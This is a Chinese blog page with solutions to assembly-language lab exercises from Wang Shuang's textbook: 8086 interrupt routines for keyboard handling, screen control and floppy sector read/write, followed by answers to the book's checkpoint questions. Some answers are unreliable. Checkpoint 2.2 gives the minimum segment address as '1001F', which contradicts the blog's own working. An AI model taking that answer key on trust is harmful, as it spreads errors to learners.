class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">2000</span></span><br><span class="line"><span class="symbol">s:</span>      <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="string">'A'</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">loop</span> s</span><br><span class="line"></span><br><span class="line"><span class="symbol">int9ret:</span><span class="keyword">pop</span> <span class="built_in">es</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">iret</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">int9end:</span><span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p>
<h2 id="实验16-编写包含多个功能子程序的中断例程"><a href="#实验16-编写包含多个功能子程序的中断例程" class="headerlink" title="实验16 编写包含多个功能子程序的中断例程"></a>实验16 编写包含多个功能子程序的中断例程</h2><p>安装一个新的int  7ch中断例程，为显示输出提供如下功能子程序</p>
<ol>
<li>清屏</li>
<li>设置前景色</li>
<li>设置背景色</li>
<li>向上滚动一行</li>
</ol>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset screen</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">200h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, offset screenend - offset screen</span><br><span class="line"><span class="keyword">cld</span></span><br><span class="line"><span class="keyword">rep</span> <span class="keyword">movsb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span>], <span class="number">200h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span> + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">screen:</span> <span class="keyword">jmp</span> short set</span><br><span class="line"><span class="comment">;考虑到安装中断例程后偏移地址发生了变化，需要重新计算相关的偏移地址</span></span><br><span class="line">table   <span class="built_in">dw</span> offset sub1 - offset screen + <span class="number">200h</span>, offset sub2 - offset screen + <span class="number">200h</span>, offset sub3 - offset screen + <span class="number">200h</span>, offset sub4 - offset screen + <span class="number">200h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">set:</span>    <span class="keyword">push</span> <span class="built_in">bx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cmp</span> <span class="number">ah</span>, <span class="number">3</span></span><br><span class="line"><span class="keyword">ja</span> sret</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bl</span>, <span class="number">ah</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">bh</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="built_in">bx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;同上</span></span><br><span class="line"><span class="keyword">call</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">cs</span>:(table - screen + <span class="number">200h</span>)[<span class="built_in">bx</span>]</span><br><span class="line"></span><br><span class="line"><span class="symbol">sret:</span>   <span class="keyword">pop</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">iret</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">sub1:</span>   <span class="keyword">push</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">es</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0b800h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">2000</span></span><br><span class="line"><span class="symbol">sub1s:</span>  <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="string">' '</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">loop</span> sub1s</span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">es</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">sub2:</span>   <span class="keyword">push</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">es</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0b800h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">2000</span></span><br><span class="line"><span class="symbol">sub2s:</span>  <span class="keyword">and</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="number">11111000B</span></span><br><span class="line"><span class="keyword">or</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">loop</span> sub2s</span><br><span class="line"></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">es</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">sub3:</span>   <span class="keyword">push</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">es</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="number">4</span></span><br><span class="line"><span class="keyword">shl</span> <span class="built_in">al</span>, <span class="built_in">cl</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0b800h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">2000</span></span><br><span class="line"><span class="symbol">sub3s:</span>  <span class="keyword">and</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="number">10001111B</span></span><br><span class="line"><span class="keyword">or</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">loop</span> sub3s</span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">es</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">sub4:</span>   <span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">di</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">es</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ds</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0b800h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">si</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">si</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">160</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">cld</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">24</span></span><br><span class="line"><span class="symbol">sub4s:</span>  <span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">160</span></span><br><span class="line"><span class="keyword">rep</span> <span class="keyword">movsb</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">loop</span> sub4s</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">80</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">sub4s1:</span> <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="number">160</span>*<span class="number">24</span>+<span class="built_in">si</span>], <span class="string">' '</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">si</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">loop</span> sub4s1</span><br><span class="line"></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ds</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">es</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">di</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">screenend:</span></span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p>参考<a href="http://blog.csdn.net/lixiang0522/article/details/8434450" target="_blank" rel="noopener">王爽《汇编语言》实验16：包含多个功能子程序的中断例程 解答</a><br>可以用伪指令org x简化该程序<br>org x表明接下来的指令从偏移地址x开始<br>修改后的相关指令如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">org <span class="number">200h</span></span><br><span class="line"><span class="symbol">screen:</span> <span class="keyword">jmp</span> short set</span><br><span class="line"></span><br><span class="line">table   <span class="built_in">dw</span> sub1, sub2, sub3, sub4</span><br><span class="line"></span><br><span class="line"><span class="symbol">set:</span>    <span class="keyword">push</span> <span class="built_in">bx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cmp</span> <span class="number">ah</span>, <span class="number">3</span></span><br><span class="line"><span class="keyword">ja</span> sret</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bl</span>, <span class="number">ah</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">bh</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="built_in">bx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> <span class="built_in">word</span> <span class="built_in">ptr</span> table[<span class="built_in">bx</span>]</span><br></pre></td></tr></table></figure></p>
<h2 id="实验17-编写包含多个功能子程序的中断例程"><a href="#实验17-编写包含多个功能子程序的中断例程" class="headerlink" title="实验17 编写包含多个功能子程序的中断例程"></a>实验17 编写包含多个功能子程序的中断例程</h2><p>安装一个新的int 7ch中断例程，实现通过逻辑扇区号对软盘进行读写。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset floppyio</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">200h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, offset floppyioend - offset floppyio</span><br><span class="line"><span class="keyword">cld</span></span><br><span class="line"><span class="keyword">rep</span> <span class="keyword">movsb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span>], <span class="number">200h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span> + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">floppyio:</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">dx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">add</span> <span class="number">ah</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ax</span> <span class="comment">;计算相应的ah和al并压栈</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">dx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">1440</span></span><br><span class="line"><span class="keyword">div</span> <span class="built_in">cx</span> <span class="comment">;计算逻辑扇区号/1440</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ax</span> <span class="comment">;将商即面号压栈</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">dx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dl</span>, <span class="number">18</span></span><br><span class="line"><span class="keyword">div</span> <span class="built_in">dl</span> <span class="comment">;计算逻辑扇区号/1440的余数/18</span></span><br><span class="line"><span class="keyword">inc</span> <span class="number">ah</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">ch</span>, <span class="built_in">al</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="number">ah</span> <span class="comment">;设置相应的ch和cl</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span> <span class="comment">;将相应的面号出栈</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">dh</span>, <span class="built_in">al</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dl</span>, <span class="number">0</span> <span class="comment">;设置相应的dh和dl</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span> <span class="comment">;将相应的ah和al出栈</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">13h</span> <span class="comment">;调用13h例程进行实际的读写</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">dx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">iret</span></span><br><span class="line"><span class="symbol">floppyioend:</span></span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/03/09/王爽汇编语言第三版实验/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/03/05/王爽汇编语言第三版检测点答案/">
                            王爽汇编语言第三版检测点答案
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-03-05T18:49:39+08:00">
	
		    3月 05, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/汇编/">汇编</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <blockquote>
<p>开学三周，王爽的《汇编语言》（第三版）总算是基本上看完了，本文是总结的第一部分，包括了书上所有的检测点答案</p>
</blockquote>
<h2 id="第一章-基础知识"><a href="#第一章-基础知识" class="headerlink" title="第一章 基础知识"></a>第一章 基础知识</h2><h3 id="检测点-1-1"><a href="#检测点-1-1" class="headerlink" title="检测点 1.1"></a>检测点 1.1</h3><ol>
<li>1个CPU的寻址能力为8KB，那么它的地址总线的宽度为____。<br> <strong>13</strong><br> 解析：CPU在内存中寻址的最小单位是Byte（字节），8KB = 2^13B，因此地址总线的宽度为13.</li>
<li>1KB的存储器有____个存储单元。存储单元的编号从____到____。<br> <strong>1024    0    1023</strong></li>
<li>1KB的存储器可以存储____个bit，____个Byte。<br> <strong>2^13    2^10</strong></li>
<li>1GB、1MB、1KB分别是____________Byte<br> <strong>2^30    2^20    2^10</strong></li>
<li>8080、8088、80286、80386的地址总线宽度分别为16根、20根、24根、32根，则他们的寻址能力分别为____（KB）、____（MB）、____（MB）、____（GB）。<br> <strong>64    1    16    4</strong></li>
<li>8080、8088、8086、80286、80386的数据总线宽度分别为8根、8根、16根、16根、32根。则它们一次可以传送的数据为：____（B）、____（B）、____（B）、____（B）、____（B）。<br> <strong>1    1    2    2    4</strong></li>
<li>从内存中读取1024字节的数据，8086至少要读取____次，80386至少要读取____次。<br> <strong>512    256</strong></li>
<li>在存储器中，数据和程序以____形式存放。<br> <strong>二进制</strong></li>
</ol>
<h2 id="第二章-寄存器"><a href="#第二章-寄存器" class="headerlink" title="第二章 寄存器"></a>第二章 寄存器</h2><h3 id="检测点-2-1"><a href="#检测点-2-1" class="headerlink" title="检测点 2.1"></a>检测点 2.1</h3><ol>
<li>写出每条汇编指令执行后相关寄存器中的值 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">62627</span>		<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">31H</span>		<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">23H</span>		<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">ax</span>		<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">826CH</span>		<span class="built_in">BX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="built_in">ax</span>		<span class="built_in">CX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">bx</span>		<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">bx</span>		<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">bh</span>		<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="built_in">bl</span>		<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">add</span> <span class="number">ah</span>, <span class="number">ah</span>		<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">al</span>, <span class="number">6</span>		<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">al</span>, <span class="built_in">al</span>		<span class="built_in">AX</span> =</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cx</span>		<span class="built_in">AX</span> =</span><br></pre></td></tr></table></figure>
 <strong>F4A3H    31A3H    3123H 6246H    826CH    6246H    826CH    04D8H    0482H    6C82H    D882H    D888H    D810H    6246H</strong></li>
<li>只能使用目前学过的汇编指令，最多使用4条指令，编程计算2的4次方。 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">ax</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="检测点-2-2"><a href="#检测点-2-2" class="headerlink" title="检测点 2.2"></a>检测点 2.2</h3><ol>
<li>给定段地址为0001H，仅通过变化偏移地址寻址，CPU的寻址范围为_____到_____。<br> <strong>00010H到1000FH</strong></li>
<li>有一数据存放在内存20000H的单元中，现给定段地址为SA，若想用偏移地址寻到此单元。则SA应满足的条件是：最小为_____，最大为_____。提示，反过来思考一下，当段地址给定为多少，CPU无论怎么变化偏移地址都无法寻到20000H单元？<br> <strong>1001F    2000H</strong><br> <strong>20000H - 0FFFFH = 10001H</strong><br> <strong>20000H - 00000H = 20000H</strong></li>
</ol>
<h3 id="检测点-2-3"><a href="#检测点-2-3" class="headerlink" title="检测点 2.3"></a>检测点 2.3</h3><p>下面的3条指令执行后，CPU几次修改IP？都是在什么时候？最后IP中的值是多少？<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">sub</span> <span class="built_in">ax</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">jmp</span> <span class="built_in">ax</span></span><br></pre></td></tr></table></figure></p>
<p>修改了四次：</p>
<ol>
<li>第1条指令执行后，IP指向第2条指令</li>
<li>第2条指令执行后，IP指向第3条指令</li>
<li>第3条指令执行后，IP指向第4条指令</li>
<li>JMP指令执行后，IP重新指向第1条指令</li>
</ol>
<h2 id="第三章-寄存器（内存访问）"><a href="#第三章-寄存器（内存访问）" class="headerlink" title="第三章 寄存器（内存访问）"></a>第三章 寄存器（内存访问）</h2><h3 id="检测点-3-1"><a href="#检测点-3-1" class="headerlink" title="检测点 3.1"></a>检测点 3.1</h3><ol>
<li><p>在Debug中，用“d 0:0 1f”查看内存，结果如下。</p>
